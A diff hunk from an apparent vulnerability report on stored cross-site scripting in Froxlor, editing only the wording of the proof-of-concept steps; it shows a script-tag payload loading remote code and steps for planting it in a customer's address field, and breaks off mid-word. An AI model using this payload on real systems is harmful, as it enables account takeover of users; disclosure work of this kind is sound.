@@ -7,7 +7,7 @@ this pakage is vulnerable for xss
 <script src=https://domain></script>
 ```
 # POC
-* used https://demo.froxlor.org/ testing
+* used https://demo.froxlor.org/ for testing
 * login to admin account
 * In customers account click on settings and update the address column with the payload and save the updates made.
 * then just login to customer ac
